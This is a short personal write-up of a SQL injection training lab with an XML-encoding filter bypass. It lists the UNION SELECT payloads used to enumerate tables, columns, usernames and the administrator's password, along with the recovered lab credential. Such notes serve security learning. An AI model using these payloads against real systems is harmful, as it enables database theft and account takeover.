## Lab: SQL injection with filter bypass via XML encoding

**Difficulty:** Practitioner
**Topic:** SQLi
**Solved:** 2026-05-8

## Initial attempts / Working attempts & Notes

- 1 UNION SELECT table_name FROM information_schema.tables--  => this was the query used in the XML payload to get the table names (I determined number of col's to be 1 and to be of string type)
- Also note that in this case, the injection point was not wrapped in an apostrophe in the app, and was instead an integer. So I could just directly attach a UNION attack with no escape apostrophe
- tables of interest: pg_user_mappings, pg_stat_user_tables, pg_user, users, user_mappings, etc...

- below query was used to list the column names of the 'users' table
    - 1 UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users'--
    - column names present are: email, password, username

- below query was used to list the usernames in the db:
    - 1 UNION SELECT username FROM users--
    - usernames present are: administrator, carlos, and wiener

- below query was used to find administrator password:
    - 1 UNION SELECT password FROM users WHERE username = 'administrator'--
    - password for administrator is: 8niecu97c9v5yhn2gfo4


